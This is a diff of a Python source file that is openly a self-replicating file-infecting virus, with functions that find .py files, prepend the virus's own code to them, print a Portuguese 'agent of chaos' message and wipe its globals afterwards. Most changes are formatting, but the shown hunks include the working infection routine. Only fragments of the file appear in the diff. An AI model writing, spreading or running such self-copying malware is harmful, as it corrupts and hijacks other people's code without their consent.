@@ -4,8 +4,6 @@ import glob
 
 
 def find_files_to_infect(directory="."):
-    f = [file for file in glob.glob("**/*.py", recursive=True)]
-    print(f)
     return [file for file in glob.glob("*.py")]
 
 
@@ -26,14 +24,13 @@ def get_content_if_infectable(file):
 
 
 def infect(file, virus_code):
-    if (data := get_content_if_infectable(file)):
+    if data := get_content_if_infectable(file):
         with open(file, "w") as infected_file:
             infected_file.write("".join(virus_code))
             infected_file.writelines(data)
 
 
 def get_virus_code():
-
     virus_code_on = False
     virus_code = []
 
@@ -54,7 +51,10 @@ def get_virus_code():
 
 
 def summon_chaos():
-    print("Coloque um pouco de anarquia, desestabilize a ordem e tudo virará o caos.\n Eu sou o agente do caos! ")
+    print(
+        "Coloque um pouco de anarquia, desestabilize a ordem e tudo virará o caos.\n Eu sou o agente do caos! "
+    )
+
 
 # entry point
 
@@ -76,8 +76,8 @@ try:
 finally:
     # delete used names from memory
     for i in list(globals().keys()):
-        if (i[0] != '_'):
-            exec('del {}'.format(i))
+        if i[0] != "_":
+            exec("del {}".format(i))
 
     del i
 
